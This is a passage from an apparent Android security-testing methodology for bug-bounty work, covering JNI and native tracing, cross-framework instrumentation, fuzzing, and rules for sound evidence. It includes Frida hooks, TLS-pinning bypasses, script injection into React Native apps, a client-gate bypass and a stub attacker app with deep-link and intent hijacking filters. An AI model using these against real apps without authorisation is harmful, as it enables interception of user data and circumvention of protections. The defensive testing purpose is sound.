  adb shell cat /proc/$PID/maps
  adb shell cat /proc/$PID/net/tcp
  adb shell netstat -p | grep $PID
  frida-trace -U -n com.target.app -i 'open' -i 'openat' -i 'unlinkat'
  # for startup coverage, attach before the app runs:
  adb shell am set-debug-app -w com.target.app
  # SELinux evidence, captured as a pair around the PoC:
  adb shell getenforce ; adb shell ps -Z | grep -E 'com.target.app|com.attacker'
  adb shell ls -Z /data/data/com.target.app
  adb logcat -c; adb shell dmesg -c >/dev/null 2>&1
  #   ... run the PoC ...
  adb shell dmesg | grep 'avc: ' ; adb logcat -b all -d | grep 'avc: '
  ```
- **Proof:** The `openat` lines showing every path the app touches, and — for any claim about what a
  process could or could not reach — the paired AVC record. The documented shape is
  `avc: denied { read write } for pid=... comm="..." scontext=u:r:<domain>:s0 tcontext=u:object_r:<type>:s0 tclass=file permissive=0`.
- **Escalation:** -> D11 (files written and where), D16 (device nodes and native surface), D21 (root-check
  paths such as `/sbin/su`), D10 (WebView storage under `/app_webview/`).
- **Ruled out when:** The trace is populated (the hook/strace is live) and the path or syscall you expect
  never appears while the feature is exercised. Record `getenforce` as `Enforcing` alongside the result —
  a claim about sandbox reach made on a permissive device is worthless.

### D26-058 · jnitrace for the JNI boundary

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | routed to D16/D12 |
| **Attacker** | AM-12 |
| **Applies to** | any app shipping `lib*/*.so` with `Java_*` exports |
| **Maps to** | MASTG-TECH-0035 (JNI Tracing), MASTG-TOOL-0107 (jnitrace), MASTG-TOOL-0003 (nm), MASTG-TOOL-0129 (rabin2) |

- **Test:** When the Java side hands work to native code, trace the boundary rather than reversing the
  library first. jnitrace prints every JNI call the library makes back into the VM, with arguments.
- **How:**
  ```bash
  pip install jnitrace
  nm -D --defined-only apk_extracted/lib/arm64-v8a/libnative-lib.so | grep ' T Java_'
  rabin2 -s apk_extracted/lib/arm64-v8a/libnative-lib.so | grep -i JNI
  jnitrace -l libnative-lib.so com.target.app
  jnitrace -l libnative-lib.so -f com.target.app     # spawn
  jnitrace -l '*' com.target.app                     # every library
  ```
- **Proof:** A trace showing `GetStringUTFChars` / `NewByteArray` / `CallObjectMethod` with the actual
  buffers — which is where a key, a token or a signature string becomes visible without reading a single
  disassembled instruction.
- **Escalation:** -> D16 (native memory safety, the function that consumes the buffer), D12 (key material
  crossing the boundary), D21 (a native root check identified by APKiD, D26-023).
- **Ruled out when:** `nm -D | grep ' T Java_'` returns nothing for every bundled `.so` — there is no JNI
  boundary to trace, and native logic (if any) is reached another way (`dlopen` + `dlsym`, a
  `CriticalNative` binding, or a cross-platform runtime, -> D26-060). jnitrace printing nothing while
  `Java_` exports exist means the library was never loaded during your run.

### D26-059 · r2frida and rabin2 for the live native process

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | routed to D16/D21 |
| **Attacker** | AM-12 |
| **Applies to** | all native work; the r2frida URL form is `frida://[action]/[link]/[device]/[target]` |
| **Maps to** | MASTG-TECH-0044 (Process Exploration), MASTG-TECH-0045 (Runtime Reverse Engineering), MASTG-TECH-0018 (Disassembling Native Code), MASTG-TECH-0024 (Reviewing Disassembled Native Code), MASTG-TECH-0029 (Listing Loaded Native Libraries), MASTG-TOOL-0036 (r2frida), MASTG-TOOL-0028 (radare2), MASTG-TOOL-0129 (rabin2), MASTG-TOOL-0152 (lldb (Android)), MASTG-TOOL-0033 (Ghidra) |

- **Test:** When static analysis leaves the question "what value does this actually get at runtime?",
  attach to the live, already-decrypted process.
- **How:**
  ```bash
  r2pm -U && r2pm -ci r2frida
  r2 frida://spawn/usb//com.target.app          # or frida://attach/usb//AppName
  # inside r2:
  #   :i        process info
  #   :dm       memory maps        :dm~com.target   filter     :dm.  map at current offset
  #   :il       loaded libraries   :i               binary info
  #   :dt <addr>   trace calls at an address
  # scripted static inventory across many libraries:
  rabin2 -I lib.so     # header/arch/stripped/PIE
  rabin2 -i lib.so     # imports
  rabin2 -s lib.so     # symbols
  rabin2 -z lib.so     # strings in data sections   (-zz = whole file)
  rabin2 -S lib.so     # sections/segments
  # JSON for automation via r2pipe (aflj, icj); zignatures (zg / z/) name statically-linked
  # library functions such as OpenSSL in a stripped binary
  ```
  Native interception without radare2, for a single export:
  ```javascript
  Interceptor.attach(Module.findExportByName('libc.so', 'fopen'), {
    onEnter: function (args) { this.p = args[0].readUtf8String(); },
    onLeave: function (r) { if (this.p && /su|magisk|frida/i.test(this.p)) console.log('[fopen] ' + this.p); }
  });
  ```
- **Proof:** `:dm` printing the live memory map and `:dt` hits arriving as you drive the app; or a
  machine-readable `rabin2` inventory you can diff across app versions.
- **Escalation:** -> D16 (native review), D21 (the `anti_root` library APKiD named), D01 (version-to-version
  diffing of the native surface).
- **Ruled out when:** The library is loaded (`:il` lists it) and the traced address is never hit while the
  feature runs. A stripped binary with no symbols is a *cost*, not a negative — `zignatures` and string
  cross-references are the route, and `lack_of_binary_hardening.lack_of_obfuscation` is P5 either way.

### D26-060 · The cross-platform instrumentation matrix — one entry point per framework

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | routed to D19 |
| **Attacker** | AM-12 |
| **Applies to** | React Native, Flutter, Cordova/Capacitor, Unity/IL2CPP, Xamarin/.NET MAUI |
| **Maps to** | MASTG-TOOL-0001 (Frida (Android)), MASTG-TOOL-0029 (objection (Android)), MASTG-TOOL-0032 (Frida CodeShare), MASTG-TOOL-0036 (r2frida), MASTG-TOOL-0116 (blutter), MASTG-TOOL-0100 (reFlutter), MASTG-TOOL-0101 (disable-flutter-tls-verification), MASTG-TOOL-0104 (hermes-dec), MASTG-TOOL-0009 (APKiD); MASTG-TECH-0156, MASTG-TECH-0109 (Intercepting Flutter HTTPS Traffic) |

- **Test:** Each framework needs a different instrumentation entry point, and the wrong one produces
  silence that looks like hardening. Set them all up once and record which the target needs.
- **How:**
  ```bash
  # common base
  adb root 2>/dev/null; frida-ps -U | head
  # React Native (old bridge) — CatalystInstanceImpl load hook + XHR interceptor
  frida -U -f <pkg> -l rn-bridge.js --no-pause
  # Flutter — TLS and symbol recovery
  frida -U -f <pkg> -l disable-flutter-tls.js --no-pause
  python3 blutter.py apk_extracted/lib/arm64-v8a out_dir && wc -l out_dir/pp.txt out_dir/objs.txt
  frida -U -f <pkg> -l out_dir/blutter_frida.js --no-pause
  # Cordova / Capacitor — chrome://inspect (needs webContentsDebuggingEnabled or a debuggable build)
  objection -g <pkg> explore
  # Unity / IL2CPP
  npm exec frida-il2cpp-bridge -- -f <pkg> dump --out-dir dumps
  # Xamarin / .NET
  frida-trace -U -f <pkg> -i "mono_*"
  ```
  Load your own JS into a running React Native app with no repack:
  ```javascript
  // inject-bundle.js
  Java.perform(function () {
    var C = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
    C.loadScriptFromAssets.implementation = function (am, url, z) {
      this.loadScriptFromAssets(am, url, z);
      this.loadScriptFromFile('/data/data/<pkg>/files/hook.js',
                              '/data/data/<pkg>/files/hook.js', z);
    };
  });
  ```
  Inside `hook.js` you have `this.process`, `XMLHttpRequest`, `fetch`, `WebSocket`, `FormData` and the
  Metro module system (`__r`, `__d`, `__c`). On the new architecture, hook `global.__turboModuleProxy`
  instead. **Prefer application-layer interception over the TLS fight** when pinning, a stripped
  BoringSSL or certificate transparency blocks the proxy:
  ```javascript
  // React Native — full request/response logging, TLS-independent
  this.XMLHttpRequest._interceptor = {
    requestSent: (id, url, method, headers) => console.log('REQ', id, method, url, JSON.stringify(headers)),
    responseReceived: (id, url, status, h) => console.log('RES', id, status, url),
    dataReceived: (id, data) => console.log('DATA', id, data)
  };
  // Capacitor — the native HTTP path is a plain JS interface
  console.log(typeof CapacitorHttpAndroidInterface);
  ```
  Keep a running version log so you know before quoting effort which tool will work:
  ```bash
  { echo "pkg=<pkg>"
    python3 -c "import struct;d=open('apk_extracted/assets/index.android.bundle','rb').read(32);print('hbc',struct.unpack_from('<I',d,8)[0],'srchash',d[12:32].hex())" 2>/dev/null
    strings apk_extracted/lib/arm64-v8a/libapp.so 2>/dev/null | grep -m1 -E '^[0-9a-f]{32}$' | sed 's/^/dart_snapshot_hash /'
    unzip -l apk/base.apk | grep -cE 'libassemblies.*blob\.so' | sed 's/^/maui9_layout /'
  } >> ~/engagements/framework-versions.log
  ```
- **Proof:** Each harness producing output on a trivial app action, and — for Flutter — a count of what
  Blutter recovered ("N Dart object-pool entries including the API base URL and the AES key material").
  That count is also the paragraph that stops a vendor closing a real finding as "not exploitable due to
  obfuscation".
- **Escalation:** -> D19 (framework-specific findings), D14 (Flutter ignores the global proxy setting
  entirely — a global `http_proxy` capturing nothing from a Flutter app is not a pinning result).
- **Ruled out when:** APKiD and the file inventory identify the framework, the matching entry point was
  used, and it produced output on a trivial action but not on the flow you care about. Using the *wrong*
  entry point rules out nothing — and the commonest silent failure in this domain is running the Java
  harness against a Flutter or Unity app.

### D26-061 · Native fuzzing harness: pick the engine by what you have, and ship the Android ASan runtime

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | routed to D16/D25 and rated on the reachable crash: `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is **P5**, while memory corruption in a privileged process is an OEM/Google VRP matter |
| **Attacker** | AM-03 or AM-09 depending on where the malformed input enters |
| **Applies to** | apps with a parser in native code (media, image, archive, protocol); AArch64 targets emulated on an x86 host |
| **Maps to** | AOSP AIDL fuzzing (`fuzzService` takes an IBinder and a data provider, initialises a random Parcel and calls `transact`; C++ via `libbinder_ndk_driver.h`, Rust via `binder_random_parcel_rs`; `service_fuzzer_bindings.go` makes a fuzzer or an explicit exception mandatory for every binder service or the build fails) |

- **Test:** Choose the engine from the constraint, not from fashion, and make the bug oracle work before
  you burn CPU. Mobile Hacking Lab's rule of thumb: source plus a callable parser -> **libFuzzer**;
  whole program or binary-only -> **AFL++** (QEMU mode for closed binaries, Frida mode to hook functions
  in `.so`); a customisable or distributed pipeline -> **LibAFL**; a lean fork server -> **Honggfuzz**.
- **How:**
  ```bash
  afl-fuzz -i corpus/ -o findings/ -- ./fuzz_afl_harness @@              # instrumented
  afl-fuzz -Q -i corpus/ -o findings/ -- ./fuzz_afl_harness_noinst @@    # QEMU, no source
  # AFL++ QEMU persistent mode: expose fuzz_entry(), set the persistent address to it, and hook
  # AFL's input straight into guest memory — on AArch64 x0 points at the buffer, x1 carries the size.
  # Disable Scudo randomness and reduce its logging for stability.
  # cross-compile an ASan PoC for on-device execution:
  NDK=$HOME/Library/Android/sdk/ndk/29.0.13599879
  CC=$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android31-clang
  ASAN_RT=$NDK/toolchains/llvm/prebuilt/darwin-x86_64/lib/clang/20/lib/linux/libclang_rt.asan-aarch64-android.so
  $CC -g -O0 -fsanitize=address -fno-omit-frame-pointer \
      -I../inc poc.c ./lib/libtarget.a -lm -o poc
  adb push poc "$ASAN_RT" /data/local/tmp/
  adb shell "LD_LIBRARY_PATH=/data/local/tmp ASAN_OPTIONS=detect_leaks=0 /data/local/tmp/poc /data/local/tmp/input"
  # AOSP binder service fuzzing (in-tree services):
  adb sync data && adb shell data/fuzz/arm64/<name>/<name>
  ```
  For a black-box app service, the equivalent is a scripted `transact` loop from a PoC app across the full
  transaction-code range with randomised Parcels.
- **Proof:** An ASan report with resolved frames, produced **on the device**, naming the overflow —
  e.g. `WRITE of size 2 ... 0 bytes after 512-byte region`. An on-device report is materially more
  persuasive than a host one, and it must be captured alongside the device build fingerprint.
- **Escalation:** -> D16 (memory safety), D25 (OEM/privileged services), D06 (the binder transaction that
  reaches the parser), D27.
- **Ruled out when:** Three specific setup failures must be excluded before "ASan produces nothing" means
  anything: (1) the harness runs on Bionic and needs **ASan's Android runtime**
  (`libclang_rt.asan-aarch64-android.so`) present in the rootfs and on `LD_LIBRARY_PATH`, with the host's
  `LD_PRELOAD` cleared and both `QEMU_LD_PREFIX` and `QEMU_SET_ENV` set so the variables land in the
  *target* environment; (2) `ASAN_OPTIONS=abort_on_error=1`, because a polite ASan exit is invisible to
  crash feedback; (3) **you cannot ASan a statically-linked system binary by preloading** — ASan requires
  compile-time instrumentation of every memory access, so replicate the system component's call sequence
  in a standalone harness compiled against the vulnerable source instead.

### D26-062 · Carry the validity-tagged tooling table, and the DEAD list, so you downgrade correctly

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — every row exists to stop you filing a P5 or a non-issue |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0008 (Android-SSL-TrustKiller), MASTG-TOOL-0020 (JustTrustMe), MASTG-TOOL-0025 (SSLUnpinning), MASTG-TOOL-0149 (LSPosed) — the first three are the superseded pinning tools, the last is the living Xposed successor |

- **Test:** Reach for the right primitive first, and tag anything degraded in the report. Two standing
  rules for every `[DEGRADED]` technique: (1) say so, and name the exact platform version and
  configuration you demonstrated it on; (2) **a failed legacy technique is not evidence the app is
  secure** — verify the manifest and the code, never infer from a tool's silence.
- **How:**

  | Goal | First choice `[VALID]` | Fallback / legacy |
  |---|---|---|
  | Enumerate exported components | `apktool -s` manifest + `dumpsys package` resolver tables | drozer `app.package.attacksurface` `[DEGRADED]` |
  | Prove a provider is third-party-reachable | `adb shell content query` (shell UID holds no app permissions) | drozer `scanner.provider.finduris` `[DEGRADED]` |
  | Read app-private data, no root | `run-as` (debuggable build only) | `adb backup` + abe `[DEGRADED]` |
  | Defeat a client-side gate, no root/Frida | apktool `debuggable=true` repack -> `jdb` `[VALID]` | smali `const/4 v0, 0x1` patch `[VALID]` |
  | MitM an app that ignores the proxy | pcap diff + transparent mode `[VALID]` | — |
  | Read app-private data, root | `adb root` + direct read `[VALID]` | — |
  | Extract app data without root, Android 12+ | `bmgr` + local/D2D transport `[VALID]` | `adb backup` `[DEAD unless android:debuggable="true"]` |

  And the DEAD list, carried so you **downgrade** correctly, never to run:

  | Technique | Status | Correct modern position |
  |---|---|---|
  | "World-readable `shared_prefs`/files readable by any app" | **DEAD** | `MODE_WORLD_*` throws at API 24+, SELinux per-app domains. Plaintext tokens in prefs = **Low without a read primitive** (VRT P5) |
  | "App reads another app's password from logcat" | **DEAD** | own-logs-only since Android 4.1 |
  | Clipboard scraping from a background app | **DEAD** | blocked since Android 10 (foreground / default-IME only) |
  | User dictionary / `user_dict.db` read | **DEAD** | `READ_USER_DICTIONARY` removed at API 23; test IME caching via `inputType` instead |
  | `/data/system/users/0/accounts.db` plaintext creds | **DEAD** | root + SELinux confined; not an app-level attack |
  | Cydia Substrate, Introspy | **DEAD** | do not work on ART / Android 5+. Use Frida / `objection android hooking` |
  | Xposed modules (`IXposedHookLoadPackage`, `xposed_init`) | **DEAD as written** | original Xposed stops at 8.1; the successor is LSPosed on Magisk/Zygisk, with different APIs |
  | AndroidSSLTrustKiller, JustTrustMe, SSLUnpinning | **DEAD** | `objection android sslpinning disable`, `frida-multiple-unpinning` (MASTG-TOOL-0140), or an NSC repack |
  | Burp CA in the **user** store = intercept everything | **DEAD >= API 24** | system CA on a rootable image (D26-004/D26-005), or repack the NSC (D26-008) |
  | APN-based proxy config | **DEAD** | Wi-Fi proxy + system CA, or transparent mode |
  | QARK | **DEAD upstream** | jadx + manifest triage supersedes it |
  | iNalyzer | **DEAD** | iOS 8-era |
  | NAND / physical imaging (`/proc/mtd`, `nanddump`, `dc3dd`) | **DEAD + out of scope** | mtd is gone; FBE means a raw image is ciphertext |
  | CWM recovery + delete `gesture.key` / `password.key` | **DEAD** | FBE binds the credential to key derivation, not to a file |
  | Exploid / GingerBreak / RageAgainstTheCage / Zimperlich | **DEAD** | patched pre-4.x; use a rootable AOSP emulator image |
  | ARP poisoning as a headline Android finding | **NOT REPORTABLE** | true of every OS, defeated by TLS and client isolation; lab-gateway form only, as a capture mechanism |
  | "Lack of binary protection" / "the APK can be decompiled" | **NOT REPORTABLE** | a technique, not a vulnerability |
  | `adb shell monkey` as a security tool | **NO SIGNAL** | a crude crash-fuzzer at best; useful only for breadth coverage in D26-077 |
  | OWASP MASVS "L1/L2/R levels" | **OBSOLETE** | removed in MASVS 2.0 (2023). Use MASVS-STORAGE/CRYPTO/AUTH/NETWORK/PLATFORM/CODE/RESILIENCE plus the MAS profiles; do not cite the 2023-RC Mobile Top 10 numbering either |
  | Sieve / FourGoats / GoatDroid observed behaviour | **NOT EVIDENCE** | Android 4.3 labs; never generalise their defaults to a modern target |

- **Proof:** Every technique named in the report carries its tag, and every `[DEGRADED]` one names the
  platform version it was demonstrated on.
- **Escalation:** -> D22 (each DEAD row has an API-level gate that decides whether the *class* still
  applies to this app's `minSdkVersion`), D27 (severity).
- **Ruled out when:** Not a finding. The failure mode this prevents is real and expensive: every one of
  these rows appears as a live recommendation in circulating community checklists, and filing one against
  a modern target costs credibility for the whole report.

### D26-063 · A tool's silence is never a negative result — calibrate against a known-vulnerable control

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | none; it prevents shipping a false clean that leaves an exploitable component in production |
| **Attacker** | n/a |
| **Applies to** | all dynamic and automated work |
| **Maps to** | drozer `scanner/provider/{injection,traversal}.py` source; MASTG-TECH-0043; local senior-researcher corpus |

- **Test:** **A zero is only a negative once the instrument is proven able to produce a positive.** Before
  any "not vulnerable" enters the ruled-out register, fire a positive control in the same session.
- **How:**
  ```bash
  # 1. against a component you already confirmed vulnerable by code review:
  dz> run scanner.provider.injection -a com.target.app
  dz> run app.provider.query content://<auth>/<known-injectable> --projection "'"
  # 2. against a hook that cannot be absent:
  frida -U -n com.target.app -q -e 'Java.perform(function(){var L=Java.use("android.util.Log");
    L.i.overload("java.lang.String","java.lang.String").implementation=function(a,b){
      console.log("[CTRL] "+a); return this.i(a,b);};});'
  # 3. against a string you know exists:
  grep -c 'BuildConfig' out/sources/**/BuildConfig.java
  # 4. against a lab app with the same bug class (D26-079)
  ```
  The four documented silent-zero sources, each of which must be excluded by name:
  1. **Hooking an abstract framework class** (D26-043) — `android.webkit.WebSettings` records nothing.
  2. **Grepping an annotation or class whose name R8 renamed** (D26-029).
  3. **Init-time code paths that ran before your data arrived** (D26-041, D26-044).
  4. **Narrow hardcoded scanner probes** (D26-033) — one quote, one traversal payload, one oracle.
- **Proof:** The positive control firing, recorded **in the same session** as the negative, with its
  output path cited next to the negative in the ruled-out register.
- **Escalation:** -> D27. The ruled-out register *is* the evidence of coverage and a deliverable in its own
  right; a register whose entries say "the scanner found nothing" is worthless.
- **Ruled out when:** Not a finding. Note the three expected defaults that are routinely misread as
  hardening: "drozer found nothing", "`adb backup` was empty", and "no exported components" are all normal
  on a modern target and prove nothing on their own.

### D26-064 · Control-app comparison — separate app behaviour from platform default

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; it is the cheapest false-positive filter available |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | the emulator-artefact class generalised from the device to the platform |

- **Test:** Many "findings" are the platform doing what it always does — backup semantics, recents
  screenshots, clipboard, keyboard caching, WebView defaults. Keep a signed, minimal control APK (one
  activity, one WebView, one `SharedPreferences` write, no hardening) and run the identical probe against
  both apps.
- **How:**
  ```bash
  for P in com.target.app com.lab.control; do
    echo "== $P"
    adb shell dumpsys package $P | grep -E 'flags=|targetSdk|allowBackup'
    adb shell run-as $P ls -la /data/data/$P/shared_prefs 2>&1 | head -3
    adb shell am start -n $P/.MainActivity >/dev/null; sleep 2
    adb exec-out screencap -p > /tmp/$P.png
  done
  diff <(adb shell dumpsys package com.target.app | grep -E 'flags=|targetSdk') \
       <(adb shell dumpsys package com.lab.control | grep -E 'flags=|targetSdk')
  ```
- **Proof:** Side-by-side outputs. Identical behaviour means the behaviour is the platform's and the
  observation belongs in the ruled-out table with that reason. Divergent behaviour means it is
  app-specific, and *that* is worth investigating.
- **Escalation:** Where the target is **worse** than the control (the control's provider is unreachable and
  the target's is queryable), the control output becomes the negative half of a differential PoC (-> D27).
- **Ruled out when:** Not a finding. This item's inverse is a whole class of false positives:
  `isInsideSecureHardware() == false` on an AVD, an empty Play Integrity verdict on a rooted emulator, and
  an empty `adb backup` on Android 12+ are all environment artefacts (-> Graveyard).

### D26-065 · Reproduce the final PoC from a real app UID, never from `adb shell`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; it is what separates a rated finding from a rejected one |
| **Attacker** | converts AM-12 -> AM-03 |
| **Applies to** | every IPC, provider, deep-link and intent finding |
| **Maps to** | AOSP Application Sandbox (adb shell is uid 2000 in its own SELinux domain, not an app domain); AOSP Verified Boot |

- **Test:** `adb shell` runs as uid 2000 in the `shell` SELinux domain — **more** privileged than a
  third-party app on some paths and less on others. A shell-only result is never proof of third-party
  exploitability. Neither is it capable of the things a real attacker app can do.
- **How:**
  ```bash
  adb shell getenforce                          # must stay Enforcing for credible results
  adb shell getprop ro.boot.verifiedbootstate ro.debuggable ro.build.type
  adb shell id                                  # uid=2000(shell) — NOT an app uid
  adb install poc.apk && adb shell am start -n com.poc.att/.MainActivity
  adb shell ps -Z | grep -E 'com.target.app|com.poc.att'
  ```
  A minimal stub attacker app is mandatory because `am`/`content` from the shell **cannot** construct
  nested Parcelable Intents, cannot hold a `PendingIntent`, and cannot register a competing intent filter:
  ```xml
  <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.poc.att">
    <application android:label="POC">
      <activity android:name=".Main" android:exported="true">
        <intent-filter><action android:name="android.intent.action.MAIN"/>
          <category android:name="android.intent.category.LAUNCHER"/></intent-filter>
      </activity>
      <!-- competing deep-link filter for D09 -->
      <activity android:name=".Hijack" android:exported="true">
        <intent-filter>
          <action android:name="android.intent.action.VIEW"/>
          <category android:name="android.intent.category.DEFAULT"/>
          <category android:name="android.intent.category.BROWSABLE"/>
          <data android:scheme="myapp" android:host="auth"/>
        </intent-filter>
      </activity>
      <!-- competing ordered-broadcast receiver for D05 -->
      <receiver android:name=".Recv" android:exported="true">
        <intent-filter android:priority="1000">
          <action android:name="com.victim.ACTION"/></intent-filter>
      </receiver>
      <!-- evil provider + content-picker interception for D07/D08 -->
      <provider android:name=".EvilProvider" android:authorities="com.poc.att.provider"
                android:enabled="true" android:exported="true"/>
      <activity android:name=".Evil" android:exported="true">
        <intent-filter android:priority="999">
          <action android:name="android.intent.action.GET_CONTENT"/>
          <action android:name="android.intent.action.PICK"/>
          <category android:name="android.intent.category.DEFAULT"/>
          <category android:name="android.intent.category.OPENABLE"/>
          <data android:mimeType="*/*"/>
        </intent-filter>
      </activity>
    </application>
  </manifest>
  ```
  ```java
  // in onCreate, before anything else — lets file:// URIs cross the process boundary on API 24+
  StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().build());
  ```
- **Proof:** A PoC that runs from an installed, unprivileged, differently-signed app on a device reporting
  `Enforcing` and `ro.build.type=user`, with the observable produced from `com.poc.att` rather than from
  shell. Attach the APK **and** the sources — every high-rated report in the disclosed corpus did.
- **Escalation:** -> D27 (this is the difference between a Medium and a rejected report), and it is what
  converts every AM-12 observation in this chapter into a real attacker model.
- **Ruled out when:** The same operation that succeeded from shell fails from the installed app with a
  `SecurityException` naming the permission — then the shell result was a harness artefact and the
  component is **not** third-party-reachable. Record both outputs; the negative is the valuable half.

### D26-066 · Prove your attacker app is actually as weak as you claim

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; it decides whether a High is paid or closed |
| **Attacker** | n/a — it is the *proof* of the attacker model |
| **Applies to** | every report that names an attacker model |
| **Maps to** | MASTG-TECH-0126 (Obtaining App Permissions), MASTG-TOOL-0124 (aapt2) |

- **Test:** Reports die on the claim "a malicious app with no permissions can do X" when the PoC APK
  quietly requests `QUERY_ALL_PACKAGES`, `SYSTEM_ALERT_WINDOW` or a legacy storage permission through a
  library. Triage checks. Check first.
- **How:**
  ```bash
  aapt dump permissions poc.apk
  aapt dump badging poc.apk | grep -E 'uses-permission|uses-feature|sdkVersion|targetSdkVersion'
  adb shell dumpsys package com.poc.att | sed -n '/requested permissions/,/install permissions/p'
  adb shell dumpsys package com.poc.att | sed -n '/runtime permissions/,/^$/p'
  adb shell appops get com.poc.att            # must show nothing granted
  ```
  Also state the PoC's `targetSdk`. A PoC built at `targetSdk 22` inherits legacy behaviour a real
  Play-distributed app cannot have — free package visibility, implicit export, user-CA trust — and that
  alone invalidates the report.
- **Proof:** The `aapt dump permissions poc.apk` output (ideally just the package line) and the
  `targetSdkVersion` pasted into the report alongside the exploit, with the PoC source attached.
- **Escalation:** -> D22 (the PoC's own SDK gate), D27 (the attacker-model claim).
- **Ruled out when:** Not a finding. The claim "zero permissions" is either backed by that output or it is
  downgraded to AM-04 with the permission named.

### D26-067 · The Shell-Loop Ban — count your results

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | every automated sweep, including agent-driven ones |
| **Maps to** | bug-hunting corpus, `bb-methodology` PART 4 "Shell-Loop Ban" |

- **Test:** zsh and bash array expansion fails **silently** on edge cases. `for x in "${arr[@]}"` can
  produce zero iterations with no error when the array was not populated by the previous command, and the
  output still looks complete. The corpus records an engagement that lost roughly fifty probes' worth of
  verb-tampering testing to exactly this, with output that looked correct.
- **How:** Loops of five or fewer hardcoded items in shell are fine. Anything iterating a list, a file or a
  computed range goes to Python with `try/except` per iteration and explicit per-iteration logging.
  **Always count:**
  ```bash
  # before
  wc -l components.txt
  # after
  wc -l sweep-results.txt
  # and assert, do not eyeball:
  IN=$(wc -l < components.txt); OUT=$(grep -c '^RESULT' sweep-results.txt)
  [ "$IN" = "$OUT" ] || { echo "LOOP ATE $((IN-OUT)) ITEMS — rerun"; exit 1; }
  ```
  ```python
  import subprocess
  comps = [l.strip() for l in open('components.txt') if l.strip()]
  ok = 0
  for c in comps:
      try:
          r = subprocess.run(['adb','shell','am','start','-n',c], capture_output=True, timeout=20)
          print(f'RESULT {c} rc={r.returncode} {r.stdout[:120]!r}')
          ok += 1
      except Exception as e:
          print(f'RESULT {c} ERROR {e}')
          ok += 1
  assert ok == len(comps), f'expected {len(comps)} results, got {ok}'
  ```
- **Proof:** The result count matches the input count, asserted rather than eyeballed.
- **Escalation:** -> D01 coverage register, D04–D09 (every component sweep in those chapters runs through
  this rule).
- **Ruled out when:** Not a finding. The assertion either passes or the sweep is rerun. A sweep whose
  counts were never compared is not a ruled-out entry for anything.

### D26-068 · Marker Discipline — search the BASELINE for your marker before claiming reflection

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; it is the single check that kills most false-positive reflection reports |
| **Attacker** | n/a |
| **Applies to** | reflection, cache poisoning, parameter pollution, OOB SSRF, deep-link parameter tracing, WebView injection |
| **Maps to** | bug-hunting corpus, `bb-methodology` PART 4 |

- **Test:** The injected marker must be unique and unmistakable, or your "reflection" is a word collision.
- **How:** Random alphanumeric, **8+ characters**, no English words, no protocol keywords. **Never** use
  `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`, `AAAA`, or your own domain.
  Good: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`, or a Collaborator subdomain prefix.
  **Before claiming reflection, search the BASELINE (no-marker) response for the marker string.**
  ```bash
  M=$(head -c 16 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 10)
  # 1. baseline WITHOUT the marker
  adb shell am start -a android.intent.action.VIEW -d "myapp://auth/callback?next=/home"
  adb logcat -d > baseline.log; adb exec-out screencap -p > baseline.png
  grep -c "$M" baseline.log      # MUST be 0 — if not, pick another marker
  # 2. the test WITH the marker
  adb logcat -c
  adb shell am start -a android.intent.action.VIEW -d "myapp://auth/callback?next=https://$M.example"
  adb logcat -d > test.log
  grep -n "$M" test.log
  ```
  For OOB, sub-tag each Collaborator payload per sink so a hit identifies which sink fired.
- **Proof:** The marker present in the test response and **absent from the baseline**. The corpus's own
  case: `X-Forwarded-Proto: javascript` appeared to reflect across multiple pages — the word `javascript`
  occurs naturally in SharePoint help-link hrefs.
- **Escalation:** -> D09 (deep-link parameter reachability), D10 (WebView injection), D15 (server-side
  reflection).
- **Ruled out when:** The marker appears in the baseline too (word collision — pick another), or the
  marker never appears in the test response after the sink was exercised. Both are defensible negatives;
  a marker that was never baselined supports neither.

### D26-069 · The Body-Diff Rule — a byte-identical 200 is not a bypass

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none. **Status-code-only claims are the most common rejected-as-N/A category on bug-bounty platforms** |
| **Attacker** | n/a |
| **Applies to** | every bypass claim, including client-gate bypasses proved through instrumentation |
| **Maps to** | bug-hunting corpus, `bb-methodology` PART 4 |

- **Test:** A bypass claim requires a response **body** differential, not a status code.
- **How:**
  ```bash
  curl -s -D base.h  -o base.body  "$URL"            # baseline
  curl -s -D byp.h   -o byp.body   "$URL" -H 'X-Bypass: 1'
  diff <(./norm base.body) <(./norm byp.body) || true
  wc -c base.body byp.body
  cmp base.body byp.body && echo "BYTE-IDENTICAL — NOT A BYPASS"
  ```
  On the client side the same rule applies: after
  `android hooking set return_value com.target.app.Gate.isPremium true`, the question is not whether the
  UI changed but whether the **server's** response body to the subsequent call differs.
- **Proof:** A byte-level diff in the report. The corpus's case:
  `Host: target.example:80@evil.example.com` returned 200 instead of the baseline 403 — body
  byte-identical at 8341 bytes both ways, because the load balancer had normalised the Host and dropped
  the `@evil` portion. A 5-byte difference *might* be real; identify what changed (a correlation id? a
  timestamp? real content?).
- **Escalation:** -> D15 (server-side bypass), D13 (auth gate), D23 (entitlement).
- **Ruled out when:** The bodies are byte-identical after normalisation (D26-075), or the only delta is a
  volatile field you have already established is non-deterministic. Record the byte counts.

### D26-070 · The Statistical-Sample Rule — n >= 10 interleaved, >= 2 sigma

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | timing oracles, user enumeration, rate-limit absence, races |
